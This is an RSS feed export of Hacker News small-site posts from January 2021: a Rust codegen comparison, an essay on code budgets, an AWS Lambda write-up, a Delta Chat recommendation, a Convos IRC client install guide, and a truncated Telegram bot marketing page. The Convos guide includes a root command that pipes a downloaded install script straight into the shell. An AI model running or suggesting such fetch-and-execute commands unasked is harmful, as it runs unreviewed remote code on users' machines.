tartColumn:1,selectionStartLineNumber:1,startColumn:1,startLineNumber:1),source:1),l:'5',n:'0',o:'rustc+1.48.0+(Editor+%231,+Compiler+%231)+Rust',t:'0')),k:51.20826189893053,l:'4',n:'0',o:'',s:0,t:'0')),l:'2',n:'0',o:'',t:'0')),version:4">the assembly</a>:</p><ul><li><code>make_squares_push_back</code> is similar to the C++ version: no unrolling
and checks for exceeding capacity.</li><li><code>make_squares_prealloc</code> is a bit of a disappointment: we don‚Äôt get
loop unrolling, presumably because the compiler was unable to remove
the bounds checks on our indexing into the <code>Vec</code>, even though we
just called <a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#method.resize"><code>resize</code></a>. We could remove the bounds check ourselves
using an <code>unsafe</code> block and
<a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#method.get_unchecked_mut"><code>get_unchecked_mut</code></a>,
but that seemed like going a bit too far.</li><li><code>make_squares_functional</code> is the clear winner for this use case. The
code is short and clear, and the compiler also does the best job
with it. The loop gets unrolled and we don‚Äôt have capacity checks.</li><li><code>make_squares_functional_array</code> seems good enough, although it
<a href="https://doc.rust-lang.org/src/alloc/boxed.rs.html#1332-1336">works</a>
by creating a <code>Vec</code> and then calling <code>into_boxed_slice</code> on it, so we
don‚Äôt get the absolute fastest possible code. Perhaps the
<code>FromIterator&lt;I&gt;</code> impl for <code>Box&lt;[I]&gt;</code> will get improved once creating
an uninitialized <code>Box&lt;[T]&gt;</code> doesn‚Äôt require nightly Rust?</li></ul></div></div></div>]]>
            </description>
            <link>https://wolchok.org/posts/cxx-trap-1-constant-size-vector/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25801949</guid>
            <pubDate>Sat, 16 Jan 2021 13:05:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Children Strike of 1972]]>
            </title>
            <description>
<![CDATA[
Score 58 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25801830">thread link</a>) | @jacquesm
<br/>
January 16, 2021 | https://www.amsterdamclassictours.com/blog/the-children-strike-of-1972 | <a href="https://web.archive.org/web/*/https://www.amsterdamclassictours.com/blog/the-children-strike-of-1972">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.amsterdamclassictours.com/blog/the-children-strike-of-1972</link>
            <guid isPermaLink="false">hacker-news-small-sites-25801830</guid>
            <pubDate>Sat, 16 Jan 2021 12:32:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Code Budgets]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25801696">thread link</a>) | @DanielBMarkham
<br/>
January 16, 2021 | https://danielbmarkham.com/code-budgets/ | <a href="https://web.archive.org/web/*/https://danielbmarkham.com/code-budgets/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        



        <main>



<article>
    
    <div>
    <div id="post-body">
        <p>How much does a line of code cost?</p><p>The naive answer is that it costs nothing. Bytes are free -- or as close to free as we can come. But it <em>has</em> to cost something. After all, it took time to type in, right? So that takes us to our first rule of "Code Economics": the cost of a line of code is measured in how much time we spend working with it.</p><p>How much value is in a line of code?</p><p>The naive answer is that the economic value of a line of code is the value of the application (which can be measured various ways) divided by the total line-of-codes (LOC). If you're making $10K per month from a thousand lines of code, each line is bringing in $10.</p><p>But that's obviously not true. We know that the same application can be written using a thousand, ten thousand, or a hundred thousand LOC. The thing the application does for people -- its value -- and the amount of code it takes to write it? They're not related at all. That takes us to the second rule of "Code Economics": a line of code has no value whatsoever. It only has value as part of some deployable application. The application is the smallest unit of economic value. (Actually, it's UX flow, but for our purposes today an application supports one UX flow that the user finds value interacting with.)</p><p>The value of an app is more directly measurable. Yes, sometimes it gets more complicated, like if the business purpose of the app is in-app purchases or referrals, but at some point money comes in and we can trace that money back to the app.</p><p>How about the cost of a line of code? Is it just the time we spend typing it in? That's obviously wrong. You have to design it, even if only in your head. You have to test it. You have to deploy it. In fact, once you start thinking about it, there's no limit to the amount of money you can spend on a line of code. If your app is successful, you might spend the rest of your lifetime maintaining that line of code -- looking at it every now and then, tweaking it, changing how it's used.</p><p>Of course, most lines of code either work fine or they never provide enough value to make anybody bother with them again. (No economic value = no technical debt) But, assuming you know enough to write an app that has value, each line of code in that app has an potentially-infinite cost.</p><p>So value comes in app-sized chunks while costs is related to the tiny pieces we use to make that app -- and to a large degree this is under our control.</p><p>We have a way in finance of dealing with things that have a limited value but a potentially-unlimited downside. We use a budget. I could go out next month and buy $500 worth of sugar-free bubblegum (I love the stuff), but I don't. I have a budget of $10 per month and I stick to it. That's not because bubblegum is such a huge drain on our finances. It's because little things add up. Without a budget, I have no reasonable way for my wife and I to discuss what's important to us. The budget isn't important. The conversation about values it drives is irreplaceable.</p><figure><img src="https://cdn.danielbmarkham.com/2021/01/code-budgeting-tablets.png" alt=""></figure><h3 id="so-why-aren-t-we-budgeting-our-code">So why aren't we budgeting our code?</h3><p>So far in our discussion, there's really no reason to pick one set of budget numbers over another. Should we limit our applications to a million lines of code? A hundred? We don't know. We can safely say two things. One, given the same value, more code equals more cost. Two, lines-of-code always grows out-of-control the more we poke at it. This leads to the conclusion in the third rule of Code Economics: the only way to limit the costs of solving a problem using programming is to arbitrarily limit the amount of code humans have to mentally-manipulate solving it.</p><p>In a way, this is all common sense. We've been doing it for years. We just haven't been explicit about it. Shared libraries, frameworks, industry standards, and a dozen other things all exist in an effort to limit the amount of code humans have to mentally-manipulate to solve problems.</p><p>So why haven't we succeeded? Why can't most programmers today do their job using four or five lines of code?</p><p>Because lines-of-code always grows the more we poke at it. When the http protocol first appeared, if you wanted a web page? You brought up a terminal and telnetted a small number of commands. Boom, there's your webpage. Now, there are easily 10, maybe 20 various standards and libraries related to what used to be 10 seconds of work. Fifty years from now there will be 40 standards. Same value, more code. Value stays the same, cost of code continues to increase.</p><p>I'd like to suggest a completely random rule that I just made up: <em><strong>Arbitrarily limit lines of code used to solve a problem and write the app with the goal of never touching it again</strong></em></p><figure><img src="https://cdn.danielbmarkham.com/2021/01/2021-01-11_11-17-16-code-budget-1.jpg" alt=""><figcaption>No matter what your tech or stack, in general, costs rise as a function of the amount of code you write and later have to maintain</figcaption></figure><figure><img src="https://cdn.danielbmarkham.com/2021/01/2021-01-11_11-18-51-code-budget-2.jpg" alt=""><figcaption>The application's value to the user, however, remains constant</figcaption></figure><figure><img src="https://cdn.danielbmarkham.com/2021/01/2021-01-11_11-19-37-code-budget-3.jpg" alt=""><figcaption>That means that there is some unknown point at which the amount of money/effort you've spent to provide the value is the same as the value it provides. Afterwards, the costs rise steeply. There is no feedback or mechanism to spot the crossover point</figcaption></figure><figure><img src="https://cdn.danielbmarkham.com/2021/01/2021-01-11_11-19-37-code-budget-4.jpg" alt=""><figcaption>Providing some arbitrary limits to the amount of code you're willing to create and maintain, even if it's past the break-even point, is the only way to prevent long-term runaway costs</figcaption></figure><p>Furthermore, since I'm making stuff up, how about a 2000-200-20 rule for folks writing microservices? Whatever problem you have to solve using microservices, you have 20 microservices to solve it in. Each of those microservices can be written with no more than 200 lines of unique code.</p><p>But wait, I hear you say. That's never going to work! Okay, so among all of those microservices you can have 2,000 lines of code in a shared library. Anything you could ever touch counts as code.</p><p>I'm not going to defend my made-up rules aside from saying that budgets always seem arbitrary, and it's not right to create a budget so small that the work can't get done. I don't believe I've done that here -- but I might be wrong! Use other budgets if you like. Hell if I care. But use budgets.</p><p>Most programmers probably don't think such a budget is fair, or workable. And I think it's fine. That's fascinating to me and indicates a lack of alignment somewhere in the way we train and socialize programmers.</p><p>I'm also suggesting a new thing that has to happen: a code budgeting discussion. Yes, Daniel, your WhizzBang widget is freaking awesome, but it uses 500 lines of code, and that's 500 lines we can't afford right now.</p><p>Whoa horsey! Wouldn't I love to hear somebody actually say that! Cost control, in a programming team. Imagine that! And what would come next? I have no idea!</p><p>But I could guess.</p><p>Don't some problems require a lot of code? Don't some applications -- most, in fact -- require us to come back to them again and again in order to keep them in alignment with changing user needs?</p><p>Both statements are true. For complex things, we write components. Those components have executing tests that describe them and are used/shared in multiple places. The more they are used/shared, the better they get. That means that components are just another project. It also means that if you don't have multiple teams using your component, you don't have a component. Component creation should be a decision made between teams and involve a completely new project. After all, they have both cost and value.</p><p>What about coming back to tweak the app as the business needs change? Assuming you have a release that is currently demonstrating value -- a big assumption, by the way -- I think you have to timebox it. Three months of verifying that the app got things mostly right. After that? You write a new app, of course. With the budget we're talking about it's not going to be a huge effort, you've already been living in this space, and it's good to rethink things. Code budgets and timelines prevent <a href="https://en.wikipedia.org/wiki/Second-system_effect">Second System Syndrome</a>. (I think we went off-the-rails somewhere with Second System Syndrome, but I digress)</p><p>There are parts of this essay that are completely made-up. I tried to point those out. There are also parts that are built on decades of experience both coding solutions and watching teams work. What I've seen over-and-over again is that really cool things happen with smart people and creative constraints. Really stupid stuff happens otherwise, because without constraints it's all <a href="https://en.wikipedia.org/wiki/Law_of_triviality">bike shedding</a>.</p><p>You need to start budgeting your code.</p><figure><img src="https://cdn.danielbmarkham.com/2021/01/Daniel-Signature.png" alt=""></figure>    </div>
</div>

</article>










</main>

            </div><div>
        <p><span>üéâ</span> You've successfully subscribed to Nerd Ducks!
        </p><p>OK</p>
    </div></div>]]>
            </description>
            <link>https://danielbmarkham.com/code-budgets/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25801696</guid>
            <pubDate>Sat, 16 Jan 2021 11:57:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Lambda ‚Äì From Skeptic to Enthusiast]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25801514">thread link</a>) | @rockyj
<br/>
January 16, 2021 | https://rockyj.in/2021/01/15/aws-lambda-usecases.html | <a href="https://web.archive.org/web/*/https://rockyj.in/2021/01/15/aws-lambda-usecases.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<div>
<article>
<div>
<h2>
AWS Lambda - From skeptic to enthusiast
</h2>
<p>
Jan 15 2021
</p>
</div>
<div>
<p>Back in 2019, I was having a discussion with a friend about using AWS Lambdas and we could not find a real use case for it. For user facing APIs I felt it would be too slow and may have unpredictable performance &amp; billing for commercial web applications. Maybe it simplified the DevOps pipeline but it was not something I would consider for building an important application, building a CI/CD pipeline is just something you do for real life applications.</p>

<p>There were (or are) other considerations as well, Lambdas sort of take away the convenience of working locally and shipping the same "stack" on to staging and production servers. For me the ideal stack is where I can run the same artifact locally and on production (and staging) with only a couple of environment variables and configuration files changed, like shipping a Docker image or a JAR file with only the environment variables changed at runtime. So all in all, I was never someone who understood or recommended the Lambda stack to anyone.</p>

<p>But things changed in mid 2020, my team needed to build a something of a "monthly statement service" where we would need to generate a PDF of the user's transactions and email it to them. This was something that was not triggered by a user request, nor was some user waiting on it. The "workload" was completely concentrated on one day of the month and we needed to do this in parallel for all the users, since doing it one-by-one for each user would take a lot of time. Being a "veteran" programmer coming from a Java / Ruby / Node background, my first thought was to use <a href="http://www.quartz-scheduler.org/">Quartz</a> / <a href="https://spring.io/projects/spring-batch">Spring Batch</a> / <a href="https://sidekiq.org/">Sidekiq</a> or <a href="https://github.com/OptimalBits/bull">Bull</a> but then few colleagues convinced me try building this feature with Lambdas.</p>

<p>Given the features we needed, we realized that we could build this as a series of <strong>functions</strong> in a pipeline where SQS would be used to invoke and communicate between Lambda groups. It looked something like this -</p>

<p><img src="https://rockyj.in/images/lambdas.png"></p>

<p>The first <strong>cron lambda</strong> would invoke iteself on the first day of the month, fetch all the users with a remote call. For each user we created a SQS message and pushed it across. The second set of lambdas (which are triggered by SQS) pick up a SQS message and do the necessary work e.g. get data, generate PDF, send email etc.</p>

<p>The benefit of this approach was that we could scale out wherever / whenever needed. If the number of customers grew to 100,000s we could scale the Lambdas so that the statements could still be sent to all users before they opened thier inbox on 10 AM on the first of every month.</p>

<p><strong>Error Handling</strong></p>

<p>Another big benefit of this approach was error handling. Imagine doing this for 100,000 users with a 99+% success rate, there could always be a few hundred users for which the lambdas would fail (e.g. error in fetching data, error in sending emails). We may want to "re-process" these failed jobs, the SQS DLQ (Dead Letter Queue) works well for this feature. All failed jobs (which were triggered by SQS messages) end up in the DLQ, we can just push these failed messages back to the main queue and re-run the failed jobs. The same applies if there was bug, we can fix the bug and re-process the DLQ.</p>

<p><strong>Final words</strong></p>

<p>Since our setup is just a set of "functions" we could run it locally and it was pretty much the same in the AWS Lambda environment. With a small change in configuration we could scale out to 100s of worker Lambdas and finally only pay for usage for the work we did at the end of every month.</p>

<p>We are really happy with the current architecture, so much so that a few other teams have now adopted it for their "asynchronous" loads.</p>

<p>At the end, I would still say that I would not use Lambdas for everything but there are some cases where they fit perfectly. To summarize -</p>

<p><strong>Lambda Pros</strong> -</p>

<ul>
  <li>üëçüèæ Great for asynchronous, non-user facing tasks</li>
  <li>üëçüèæ Easy to scale out</li>
  <li>üëçüèæ Great for cron jobs where load is for a specific time e.g. nightly / weekly / monthly jobs</li>
  <li>üëçüèæ DLQs make running failed jobs super easy</li>
</ul>

<p><strong>Lambda Cons</strong> -</p>

<ul>
  <li>üëéüèæ Still not convinced about usage for user facing APIs (e.g RESTful API)</li>
  <li>üëéüèæ Team would still need to learn and deploy a new DevOps stack (apart from a container based stack like K8 / Fargate)</li>
  <li>üëéüèæ Only Node, Python and JVM language support exists</li>
  <li>üëéüèæ Node is not so great for CPU intensive jobs and startup times for JVM are not so good (but if you do not care about latency it's fine)</li>
  <li>üëéüèæ You lose on stuff like a warm JVM, JIT, connection pools and other advantages that kick in with time / caching since each request sort of spins up a new container / VM</li>
</ul>

<p>So to conclude, I would not say that I would use Lambdas for every problem but I think I have found a pretty good use case for them and for that it does a great job.</p>

</div>
<hr>

</article>
</div>
</div></div>]]>
            </description>
            <link>https://rockyj.in/2021/01/15/aws-lambda-usecases.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25801514</guid>
            <pubDate>Sat, 16 Jan 2021 11:04:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Email is the messenger you should migrate to]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25801438">thread link</a>) | @tutfbhuf
<br/>
January 16, 2021 | https://jlelse.blog/posts/email-messenger-delta-chat | <a href="https://web.archive.org/web/*/https://jlelse.blog/posts/email-messenger-delta-chat">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><data value="https://jlelse.blog/posts/email-messenger-delta-chat"></data><div><p>Published on <time datetime="2021-01-14T17:23:36+01:00">January 14, 2021</time> in <a href="https://jlelse.blog/posts">‚úçÔ∏è Posts</a></p></div><div><p>Today I have heard again a discussion about WhatsApp, Telegram, Signal and Threema and there was the question to which messenger one would switch from WhatsApp.</p><p>While I find Telegram very pleasant as an everyday messenger, since it offers me the best user experience and also has some features (bots, channels) that other messengers don‚Äôt have, <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Delta Chat came to mind again</a>.</p><p>Everyone has an email address, email is decentralized and Delta Chat encrypts messages automatically.</p><blockquote><p>What I really like about this is, that using the existing email infrastructure enables everyone to communicate with each other without the restriction to use the same messenger or client. Anyone can choose any client and can still be connected. Just login with your usual email account. You don‚Äôt even need to use one of those messaging optimized clients and stay with your regular email client.</p><p>‚Äì <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Jan-Lukas Else (2019)</a></p></blockquote><p>I installed <a href="https://delta.chat/" target="_blank" rel="noopener">Delta Chat</a> on my smartphone again today. While the app wasn‚Äôt quite mature 2 years ago, I have to say it‚Äôs pretty decent now. The Android app seems to be based on the Signal interface. But Delta Chat is also available for desktops (Windows, macOS and Linux) and iOS. And the best part - something Signal, Threema and WhatsApp have problems with - Delta Chat can be used from multiple devices without any problems.</p><p>But the most important thing: Delta Chat allows you to communicate even with people who don‚Äôt use Delta Chat at all, all you need is an email address! If you write to someone without Delta Chat, they will just get a normal email. I would argue that even beats Matrix or XMPP.</p><p>Conclusion: If you are concerned about security when chatting and would rather use a decentralized messenger (no silo), you are in good hands with email and Delta Chat.</p><p>However, it would be advisable not to use Gmail, Outlook or GMX as email service, but a reasonable email service. I use <a href="https://www.servercow.de/mailcow?lang=en" target="_blank" rel="noopener">mailcow</a> for example, where just today there was <a href="https://mailcow.email/2021/01/14/back-to-the-future-with-delta-chat/" target="_blank" rel="noopener">an announcement about Delta Chat</a>.</p></div><p><b>Tags</b>:
<a rel="tag" href="https://jlelse.blog/tags/delta-chat">Delta Chat</a>
<a rel="tag" href="https://jlelse.blog/tags/email">Email</a>
<a rel="tag" href="https://jlelse.blog/tags/messenger">Messenger</a>
<a rel="tag" href="https://jlelse.blog/tags/opinion">Opinion</a></p></article></div></div>]]>
            </description>
            <link>https://jlelse.blog/posts/email-messenger-delta-chat</link>
            <guid isPermaLink="false">hacker-news-small-sites-25801438</guid>
            <pubDate>Sat, 16 Jan 2021 10:41:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Convos: The self-hosted alternative to IRCCloud]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25801002">thread link</a>) | @onerom
<br/>
January 16, 2021 | https://serhack.me/articles/convos-web-client-persistent-irc/ | <a href="https://web.archive.org/web/*/https://serhack.me/articles/convos-web-client-persistent-irc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://serhack.me/images/convos/convos.png" alt="The IRC Client: Convos"></p><p>Throughout 2020, in large part due to the lockdown, many people have started to become familiar with internal communication tools. Microsoft Teams, Slack, Telegram, Mattermost, and a few others are the most widely used and recognizable of these tools, but there still seems to be some people using Internet Relay Chat (IRC) ‚Äï one of the first online messaging services.</p><p>Many of the widely used international communication tools have been inspired by IRC, which is gradually falling into disuse due to the modern UI and UX and additional features being offered by these more well-known messaging applications.</p><p>Despite IRC being considered archaic, it is still being used today as a meeting place for many online communities. For example, people who are nostalgic for the early days of the Internet and users of, and contributors to, open-source software projects make IRC a place for discussion ‚Äï where it is not the identity that defines who you are, but the content.</p><p>In this article, I will illustrate what IRC is and share with you a product that greatly enhances the IRC protocol by adding features that are common to modern messaging applications. If you are searching for a convenient, self-hosted solution to connect to IRC, then this article is for you.</p><p>In the following paragraphs, we will discuss:</p><ul><li>What the IRC communication protocol is;</li><li>Getting a persistent, always-online chat on IRC;</li><li>Convos, an alternative to IRCCloud and its features;</li><li>The installation of Convos on Debian/Ubuntu; and</li><li>Convos configuration.</li></ul><h2 id="the-irc-communication-protocol">The IRC Communication Protocol</h2><p>IRC is a service that facilitates online communication via messages based on the ‚Äúclient-server‚Äù model. In a more technical and precise way, IRC can be considered a network protocol (at the application level) that uses a network composed of servers to easily send messages to network participants.</p><p>Developed in 1988 by Jarkko Oikkarinen, a Finnish student who wanted to create a communication system that would enable real time discussions for a network at his university, IRC quickly expanded to the point where more than 200,000 users were connected every day.</p><p>To start exchanging messages, the user must first connect to the IRC network via a client (e.g., <a href="https://www.pidgin.im/">Pidgin</a>, mIRC), which then connects to the server closest to the user in order to ensure high-speed performance. There are several networks, such as <a href="https://freenode.net/">Freenode</a>, <a href="https://www.swiftirc.net/">Swift IRC</a>, <a href="http://www.ircnet.org/">IRCNet</a>, and <a href="https://www.quakenet.org/">QuakeNet</a>.</p><p>Within IRC, you log in with a nickname (ASCII characters). This allows you to be recognized by the network to which you have connected. To initial a conversation, there are two different ways: start <strong>a private chat</strong> with another user (query) or connect to a <strong>channel</strong>.</p><p>A channel is a dedicated place to chat with a group of users, without writing to each one separately. It might sound strange nowadays, but in the late 1980s and early 1990s, this was viewed as revolutionary and a game changer with regard to how people connected over the Internet. A channel is typically administered by users, called operators, with special privileges and the ability to turn people away and invite them, make the channel private (invisible to the network), set a password, and much more.</p><p>From a technical point of view, an IRC network, currently described by the standard <a href="http://www.faqs.org/rfc/rfc1459.txt">RFC 1459</a>, is composed of several nodes maintained by a centralized entity. When a user with a special client connects to one of the servers, the whole network must be informed about the presence of this client, replicating across all servers the following: nickname, name of the host from which the client has access to the Internet, and the name of the server to which this host is connected.</p><p>Regarding the nickname, you might wonder if another person could impersonate your nickname. The solution to this problem is to register your nickname with a password, so that (in the future) the server can ask you to identify yourself with the password. Here you can read about <a href="https://meta.wikimedia.org/wiki/IRC/Instructions">How to register your nickname on Freenode</a>.</p><p>As alluded to above, from a historical point of view, IRC represents a consolidated communication protocol that is still used today as a discussion environment for people who are nostalgic for the early days of the Internet and users of, and contributors to, open-source software projects. In a way, this has influenced the basic UI and UX of IRC. Today, this appreciation has gone well beyond these users, as IRC has inspired our modern day messaging applications. As an example, Slack is a sexier version of IRC ‚Äï dressed up with better UI and UX and having a few modernized features. At their core, though, IRC and today‚Äôs messaging applications are no different, as groups are the channels, queries are the private chats, and operators are the administrators.</p><p>If you would like to discover all the commands to better manage your own channel, I suggest you to read <a href="https://en.wikipedia.org/wiki/List_of_Internet_Relay_Chat_commands">the list of commands available on IRC</a>.</p><p>For a long time, IRC has been a gathering place for many communities, including Firefox, Bitcoin, Gnome, and many others. IRC has also been the site of many historic ‚Äújokes'' on the Internet. It would be remiss of me not to mention some of these most notable moments: <a href="http://bash.org/?244321">Hunter2</a>, <a href="http://bash.org/?5273">the guy who lost a device in his apartment</a>, and the timeless <a href="http://bash.org/?400459">‚Äúdoes anyone speak python here?"</a>.</p><figure><img src="https://imgs.xkcd.com/comics/team_chat.png"><figcaption><h4>IRC will never die (gently provided by XKCD)</h4></figcaption></figure><p>Arguably the biggest disadvantage of IRC is that you cannot always be connected to a specific server, unless you leave the client on all the time. Unlike normal messaging clients, you will not receive messages if you are not present on the IRC network. In fact, the remote nodes of IRC do not store any messages!</p><p>One of the solutions for this problem is to buy a <a href="https://en.wikipedia.org/wiki/Virtual_private_server">VPS</a> and manage the connection to IRC via a text client with a command line interface. However, this can be inconvenient on mobile devices and, specifically, for a person unfamiliar with the command line. To get around this problem, there is a free self-hosted alternative called Convos that allows you to connect via a web interface to IRC, but that‚Äôs not all!</p><h2 id="convoschat-the-solution-to-always-being-connected">Convos.chat: The Solution to Always Being Connected</h2><p><a href="https://convos.chat/">Convos</a> is an open-source, self-hosted client for connecting to IRC maintained by <a href="https://thorsen.pm/">Jan Henning Thorsen</a> and <a href="https://marcus.means.no/">Marcus</a>. The backend was developed with <a href="https://mojolicious.org/">Mojolicious</a>, a Perl framework, while the front-end used the Javascript framework <a href="https://svelte.dev/">Svelte</a>.</p><p>Developed in 2014, Convos has evolved into a very interesting project, despite being maintained by only one person. Among its main features, we find the persistent IRC connection that eliminates the risk of missing some important discussions! The user is connected as long as the Convos daemon is active and each message is stored in a log accessible only to the owner of the server.</p><p>Convos is one of the simplest ways to use IRC and it is always online, so initiating and staying in a discussion has never been easier. Its simple interface allows you to send messages on IRC from any device, be it a smartphone or a fridge ‚Äï you just need a browser. You can also choose a theme from those available or <a href="https://convos.chat/blog/2020/6/14/create-your-own-theme-detailed-walkthrough">write your own</a>. Another advantage of Convos is its self-hosted nature. There is no centralized third-party server (like with <a href="https://irccloud.com/">IRCCloud</a>) that stores your messages. With Convos, no one besides you will see your IRC messages and logs.</p><figure><img src="https://serhack.me/images/convos/screenshot.jpg"><figcaption><h4>Convos User Interface</h4></figcaption></figure><p>If you need to upload a file, but do not want to share it with third parties, Convos allows you to upload a file of any extension to your server. Drag and drop the file and Convos will do the rest, creating a unique link for you to share in order to access the file. Want to delete it? You can do it without any problem!</p><p><img src="https://serhack.me/images/convos/drag_and_drop.gif" alt="Drag and Drop per Convos"></p><p>For text files, it gets even better. All messages that will have more than four ‚Äúline breaks‚Äù will be uploaded to a personalized pastebin.</p><p>As we are all well aware, in 2020, having an <a href="https://unicode.org/emoji/charts/full-emoji-list.html">Emoji</a> available is a must! Just type <code>:emoji_name</code> to see the list of emojis available on Convos. Note that all <a href="https://unicode.org/">Unicode</a> characters are also compatible, so across smartphones there will be no problems. You can also add links and make <strong>bold</strong> and/or <em>italicize</em> your posts with <a href="https://www.markdownguide.org/">Markdown</a>.</p><p>Given that IRCCloud is a service (with similar features) that is both <strong>centralized</strong> and <strong>expensive</strong>, <a href="https://convos.chat/">Convos</a> is the leading free alternative. Over the past few years, IRCCloud‚Äôs infrastructure has suffered several periods of downtime, which has impacted many (if not all) its users. Unlike IRCCloud, the expenses and stability of running a private server for Convos is more cost-efficient and reliable, especially when compared to the pricing model (per user/per month) and the fragile nature of the IRCCloud infrastructure.</p><h3 id="how-to-start-chatting-with-convos">How to Start Chatting with Convos</h3><p>Installation and configuration of Convos is very simple and does not require any special knowledge of shell scripting. The developers have prepared a very convenient way to run script, so that you will be able to install the Web client quickly.</p><div><pre><code data-lang="bash">root@nodo#: curl https://convos.chat/install.sh | sh -</code></pre></div><p>Here is the <a href="https://convos.chat/install.sh">Script code</a>, if you want to view it. If the script did not show any problems, we can proceed by starting the Convos daemon:</p><div><pre><code data-lang="bash">root@nodo#: ./convos/script/convos daemon</code></pre></div><p>Launch your browser and enter <code>http://localhost:3000</code> to start chatting. There are no additional steps. You only have to choose the IRC network (e.g. Freenode) and Convos will do the rest!</p><p>Since you will be the first user, by default you will be set up as the Convos administrator. This will allow you to manage users, reset passwords as needed or create new ones, and set some <a href="https://convos.chat/doc/config#global-config-settings">global environment variables</a> as the default Convos connection.</p><p>You can change the listening port or IP address via the <a href="https://convos.chat/doc/config#listen"><code>--listen</code></a> flag; although, it is strongly recommended to run Convos behind a proxy server.</p><p>If you want to run Convos through a proxy server, I recommend you read the guide <a href="https://convos.chat/doc/reverse-proxy">‚ÄúHow to Run Convos Behind Your Favourite Server‚Äù</a>. A reverse proxy is a particular application that acts as an intermediary, in this case, between the client (the user) and the Convos daemon. It is useful if you want to have features such as SSL management, load balancing, compression, and ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serhack.me/articles/convos-web-client-persistent-irc/">https://serhack.me/articles/convos-web-client-persistent-irc/</a></em></p>]]>
            </description>
            <link>https://serhack.me/articles/convos-web-client-persistent-irc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25801002</guid>
            <pubDate>Sat, 16 Jan 2021 08:41:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Safari supports user style sheets]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25800992">thread link</a>) | @SimeVidas
<br/>
January 16, 2021 | https://webplatform.news/issues/2021-01-15 | <a href="https://web.archive.org/web/*/https://webplatform.news/issues/2021-01-15">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://webplatform.news/issues/2021-01-15</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800992</guid>
            <pubDate>Sat, 16 Jan 2021 08:39:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is a Telegram Bot? Reasons to Use Bot for Telegram]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25800876">thread link</a>) | @botpenguin
<br/>
January 16, 2021 | https://botpenguin.com/what-is-a-telegram-bot-reasons-to-use-bot-for-telegram/ | <a href="https://web.archive.org/web/*/https://botpenguin.com/what-is-a-telegram-bot-reasons-to-use-bot-for-telegram/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="im">
<div>

<p>In today‚Äôs modern era, businesses should continually evolve to keep their customers engaged to survive in a highly competitive marketplace. Formulating a better place to support your client space can work in your favor for a better future. Moreover, since CSS plays a crucial role, so level-up the UX interface with messengers and connect with the targeted audience on social media.</p>
<h2>What is this Telegram Bot?</h2>
<p>The Telegram Bot is simply accounts or profiles over Telegram operated by software which is generally powered by AI (artificial intelligence). They can literally do anything on behalf of you and your business, such as teaching, guiding, assisting, helping broadcast, reminding, connecting, integrating with other platforms, and taking users‚Äô commands. With high-end technological engines of deep learning, machine learning, and NLP, it is possible to let a bot understand human context or tone easily and offer solutions in the meantime.</p>
<p>In simpler words,</p>
<p>‚ÄúA <a href="https://botpenguin.com/chatbot-for-telegram/">Telegram Bot</a> is an AI-inspired bot that can serve companies or brands with many features such as sending out information, reminders, playing tunes, ordering, and more.‚Äù</p>
<p>The best part of Telegram is it is highly safe and lets customers have secret chats. So, now as you get to know what bot for Telegram, let‚Äôs begin with why your business needs to integrate a bot in Telegram.</p>
<p>A popular messenger such as Facebook and WhatsApp is the texting messenger. It gains high adoption rates, especially by companies, and is powerfully used after WhatsApp. Telegram is a cloud-based instant messaging system developed by the enterprise registered in London, United Kingdom.</p>
<p>This app is available for iOS, Android, Windows &amp; Desktop. It looks like Whatsapp and lets the users share data like photos, videos, audios, and other documents. Surprisingly, users may create groups of up to 200,000 people or channels for streaming to unlimited people or audience base. The best is they support an end to end encrypted voice calls.</p>
<p>We suggest you leave your brand playing on Telegram to engage a better audience base as Telegram allows users to create a telegram bot and run them through the telegram channels to complete the task. Now you could think about managing many social platforms together, so you don‚Äôt have to worry because the telegram bot can do it on your behalf.</p>
<h2>Top Reasons for Deploying Bot in Telegram</h2>
<p>Bots are getting more and more popular as third-party applications to run in a telegram environment. And a big thanks goes to Telegram And a big thank you goes to the telegram APIs, with which you quickly build telegram bot, promote them and generate them to make your platform more convenient for users.</p>
<p>‚ÄúA telegram bot can simplify the conversation between the user and a machine and let them execute the task seamlessly. It helps you to engage the user for long enough, gathers necessary data, and more.‚Äù</p>
